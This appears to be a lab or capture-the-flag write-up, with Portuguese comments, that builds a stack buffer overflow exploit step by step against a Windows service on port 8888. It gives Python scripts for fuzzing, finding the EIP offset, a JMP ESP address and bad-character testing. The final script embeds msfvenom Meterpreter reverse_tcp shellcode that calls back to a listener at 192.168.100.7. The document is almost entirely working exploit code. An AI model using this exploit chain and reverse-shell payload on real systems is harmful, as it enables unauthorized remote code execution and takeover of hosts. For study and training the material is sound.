
# Buffer Overflow
168 Machine Solution

## Connection

```python
#!/usr/bin/python

import sys, socket

contador=500

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

buffer = "A" * contador
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
s.close()
```

## Fuzzing

```python
#!/usr/bin/python

import sys, socket, time

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

contador = 100

while True:

    buffer = "A" * contador
    buffer += "\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((sys.argv[1], 8888))
        print s.recv(1024)
        print "Sending evil buffer de %s bytes" %contador
        print buffer
        print ""
        s.send(buffer)
        s.close()
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    time.sleep(1)
    contador+=100
```

## Pattern
```python
#!/usr/bin/python

import sys, socket

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()
```

## EIP
```python
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
offset = "A" * 452
eip = "BBBB"
esp = "C" * 400
buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()
```

## JMP ESP
```python
#!/usr/bin/python

import sys, socket
from struct import *

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
# offset = "A" * 452
# eip = "BBBB"
# esp = "C" * 400

# passo 5  - temos que o offset e 452, e agora controlamos eip. Agora achamos esp para que possamos preencher com o shellcode. Assim, precisamos que o eip salte para o esp. Digitamos no immunity debugger !mona jmp -r esp e acessamos no log para verificar um endereco de uma dependencia, pois as dlls possuem endereco fixo. Pegamos o endereco da lib helvio, que eh 6B841615.
offset = "A" * 452
eip = pack('<L',0x6B841615)
esp = "C" * 400


buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()
```

## Byte Array 
```python
#!/usr/bin/python

import sys, socket
from struct import *

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
# offset = "A" * 452
# eip = "BBBB"
# esp = "C" * 400

# passo 5  - temos que o offset e 452, e agora controlamos eip. Agora achamos esp para que possamos preencher com o shellcode. Assim, precisamos que o eip salte para o esp. Digitamos no immunity debugger !mona jmp -r esp e acessamos no log para verificar um endereco de uma dependencia, pois as dlls possuem endereco fixo. Pegamos o endereco da lib helvio, que eh 6B841615.
# offset = "A" * 452
# eip = pack('<L',0x6B841615)
# esp = "C" * 400

# passo 6 - descobrir quais badchars dao problema na aplicacao.  tres badchars consagrados - 00 0a 0x (nullbyte, carriage return e pular linha - 00, \r, \n ). Envia o bytearay, coloca breakpoint e compara o bytearray enviado atraves do comando do mona !mona compare -f c:\logs\aplicacao\bytearray.bin -a [endereco-onde-se-encontra01 02 03 04], que e 0022fb78  
offset = "A" * 452
eip = pack('<L',0x6B841615)
# esp = "C" * 400
bytearray = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
 "\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
 "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
 "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
 "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
 "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
 "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
 "\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

esp = bytearray

buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()
```

## Shell Code Injection
```python
#!/usr/bin/python

import sys, socket
from struct import *

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

# passo 1 - teste de conectividade
# buffer = "A" * 1000

# passo 2 - vem do passo1, em que com um fuzzer, descobre-se que a aplicacao crasheia, e assim, contador=500
# outro arquivo, pois o poc nao precisa fazer loop

# passo 3 - gera-se uma string com msf-pattern-create -l 500 (vindo de passo2-fuzzing). Assim, descobre-se o endereco exato em que aplicacao crashei, encontrado o eip
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

# passo 4 - sabemos de passo 3 que o offset e 452, pois o conteudo de eip apos o envio de poc3 ficou 31704130, e ao darmos msf-pattern_offset -q 31704130 ficou 452
# offset = "A" * 452
# eip = "BBBB"
# esp = "C" * 400

# passo 5  - temos que o offset e 452, e agora controlamos eip. Agora achamos esp para que possamos preencher com o shellcode. Assim, precisamos que o eip salte para o esp. Digitamos no immunity debugger !mona jmp -r esp e acessamos no log para verificar um endereco de uma dependencia, pois as dlls possuem endereco fixo. Pegamos o endereco da lib helvio, que eh 6B841615.
# offset = "A" * 452
# eip = pack('<L',0x6B841615)
# esp = "C" * 400

# passo 6 - descobrir quais badchars dao problema na aplicacao.  tres badchars consagrados - 00 0a 0x (nullbyte, carriage return e pular linha - 00, \r, \n ). Envia o bytearay, coloca breakpoint e compara o bytearray enviado atraves do comando do mona !mona compare -f c:\logs\aplicacao\bytearray.bin -a [endereco-onde-se-encontra01 02 03 04], que e 0022fb78  
# offset = "A" * 452
# eip = pack('<L',0x6B841615)
# esp = "C" * 400
# bytearray = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
# "\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
# "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
# "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
# "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
# "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
# "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
# "\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


# passo 7 - criar o payload com msfvenom, colocando o payload a variavel esp 
offset = "A" * 452
eip = pack('<L',0x6B841615)

# shellcode - msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.7 lport=443 -b "\x00\x05\x06\x0a\x0d\x21\x22\x23\x24\xc4\xc5\xe3\xe4" -a x86 --platform win -v esp -f python
esp =  b""
esp += b"\x2b\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81"
esp += b"\x76\x0e\x28\x1e\x15\xfc\x83\xee\xfc\xe2\xf4\xd4\xf6"
esp += b"\x97\xfc\x28\x1e\x75\x75\xcd\x2f\xd5\x98\xa3\x4e\x25"
esp += b"\x77\x7a\x12\x9e\xae\x3c\x95\x67\xd4\x27\xa9\x5f\xda"
esp += b"\x19\xe1\xb9\xc0\x49\x62\x17\xd0\x08\xdf\xda\xf1\x29"
esp += b"\xd9\xf7\x0e\x7a\x49\x9e\xae\x38\x95\x5f\xc0\xa3\x52"
esp += b"\x04\x84\xcb\x56\x14\x2d\x79\x95\x4c\xdc\x29\xcd\x9e"
esp += b"\xb5\x30\xfd\x2f\xb5\xa3\x2a\x9e\xfd\xfe\x2f\xea\x50"
esp += b"\xe9\xd1\x18\xfd\xef\x26\xf5\x89\xde\x1d\x68\x04\x13"
esp += b"\x63\x31\x89\xcc\x46\x9e\xa4\x0c\x1f\xc6\x9a\xa3\x12"
esp += b"\x5e\x77\x70\x02\x14\x2f\xa3\x1a\x9e\xfd\xf8\x97\x51"
esp += b"\xd8\x0c\x45\x4e\x9d\x71\x44\x44\x03\xc8\x41\x4a\xa6"
esp += b"\xa3\x0c\xfe\x71\x75\x76\x26\xce\x28\x1e\x7d\x8b\x5b"
esp += b"\x2c\x4a\xa8\x40\x52\x62\xda\x2f\x97\xfd\x03\xf8\xa6"
esp += b"\x85\xfd\x28\x1e\x3c\x38\x7c\x4e\x7d\xd5\xa8\x75\x15"
esp += b"\x03\xfd\x74\x1f\x94\xe8\xb6\x71\xfb\x40\x1c\x15\xfd"
esp += b"\x93\x97\xf3\xac\x78\x4e\x45\xbc\x78\x5e\x45\x94\xc2"
esp += b"\x11\xca\x1c\xd7\xcb\x82\x96\x38\x48\x42\x94\xb1\xbb"
esp += b"\x61\x9d\xd7\xcb\x90\x3c\x5c\x14\xea\xb2\x20\x6b\xf9"
esp += b"\x14\x4f\x1e\x15\xfc\x42\x1e\x7f\xf8\x7e\x49\x7d\xfe"
esp += b"\xf1\xd6\x4a\x03\xfd\x9d\xed\xfc\x56\x28\x9e\xca\x42"
esp += b"\x5e\x7d\xfc\x38\x1e\x15\xaa\x42\x1e\x7d\xa4\x8c\x4d"
esp += b"\xf0\x03\xfd\x8d\x46\x96\x28\x48\x46\xab\x40\x1c\xcc"
esp += b"\x34\x77\xe1\xc0\x7f\xd0\x1e\x68\xd4\x70\x76\x15\xbc"
esp += b"\x28\x1e\x7f\xfc\x78\x76\x1e\xd3\x27\x2e\xea\x29\x7f"
esp += b"\x76\x60\x92\x65\x7f\xea\x29\x76\x40\xea\xf0\x0c\x11"
esp += b"\x90\x8c\xd7\xe1\xea\x15\xb3\xe1\xea\x03\x29\xdd\x3c"
esp += b"\x3a\x5d\xdf\xd6\x47\xd8\xab\xb7\xaa\x42\x1e\x46\x03"
esp += b"\xfd\x1e\x15\xfc"


# shellcode - msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.7 lport=4321 -b "\x00\x05\x06\x0a\x0d\x21\x22\x23\x24\xc4\xc5\xe3\xe4" -a x86 --platform win -v esp -f python
# esp =  b""
#esp += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
#esp += b"\x76\x0e\x4d\xa0\x2d\x3e\x83\xee\xfc\xe2\xf4\xb1\x48"
#esp += b"\xaf\x3e\x4d\xa0\x4d\xb7\xa8\x91\xed\x5a\xc6\xf0\x1d"
#esp += b"\xb5\x1f\xac\xa6\x6c\x59\x2b\x5f\x16\x42\x17\x67\x18"
#esp += b"\x7c\x5f\x81\x02\x2c\xdc\x2f\x12\x6d\x61\xe2\x33\x4c"
#esp += b"\x67\xcf\xcc\x1f\xf7\xa6\x6c\x5d\x2b\x67\x02\xc6\xec"
#esp += b"\x3c\x46\xae\xe8\x2c\xef\x1c\x2b\x74\x1e\x4c\x73\xa6"
#esp += b"\x77\x55\x43\x17\x77\xc6\x94\xa6\x3f\x9b\x91\xd2\x92"
#esp += b"\x8c\x6f\x20\x3f\x8a\x98\xcd\x4b\xbb\xa3\x50\xc6\x76"
#esp += b"\xdd\x09\x4b\xa9\xf8\xa6\x66\x69\xa1\xfe\x58\xc6\xac"
#esp += b"\x66\xb5\x15\xbc\x2c\xed\xc6\xa4\xa6\x3f\x9d\x29\x69"
#esp += b"\x1a\x69\xfb\x76\x5f\x14\xfa\x7c\xc1\xad\xff\x72\x64"
#esp += b"\xc6\xb2\xc6\xb3\x10\xc8\x1e\x0c\x4d\xa0\x45\x49\x3e"
#esp += b"\x92\x72\x6a\x25\xec\x5a\x18\x4a\x5f\xf8\x86\xdd\xa1"
#esp += b"\x2d\x3e\x64\x64\x79\x6e\x25\x89\xad\x55\x4d\x5f\xf8"
#esp += b"\x6e\x1d\xf0\x7d\x7e\x1d\xe0\x7d\x56\xa7\xaf\xf2\xde"
#esp += b"\xb2\x75\xba\x54\x48\xc8\xed\x96\x29\xa4\x45\x3c\x4d"
#esp += b"\xb0\xcc\xb7\xab\xca\x3d\x68\x1a\xc8\xb4\x9b\x39\xc1"
#esp += b"\xd2\xeb\xc8\x60\x59\x32\xb2\xee\x25\x4b\xa1\xc8\xdd"
#esp += b"\x8b\xef\xf6\xd2\xeb\x25\xc3\x40\x5a\x4d\x29\xce\x69"
#esp += b"\x1a\xf7\x1c\xc8\x27\xb2\x74\x68\xaf\x5d\x4b\xf9\x09"
#esp += b"\x84\x11\x3f\x4c\x2d\x69\x1a\x5d\x66\x2d\x7a\x19\xf0"
#esp += b"\x7b\x68\x1b\xe6\x7b\x70\x1b\xf6\x7e\x68\x25\xd9\xe1"
#esp += b"\x01\xcb\x5f\xf8\xb7\xad\xee\x7b\x78\xb2\x90\x45\x36"
#esp += b"\xca\xbd\x4d\xc1\x98\x1b\xdd\x8b\xef\xf6\x45\x98\xd8"
#esp += b"\x1d\xb0\xc1\x98\x9c\x2b\x42\x47\x20\xd6\xde\x38\xa5"
#esp += b"\x96\x79\x5e\xd2\x42\x54\x4d\xf3\xd2\xeb"

buffer = offset + eip + esp

buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
# print "Sending evil buffer de %s bytes" %contador
print buffer
s.send(buffer)
print "[+] buffer enviado"
s.close()
```

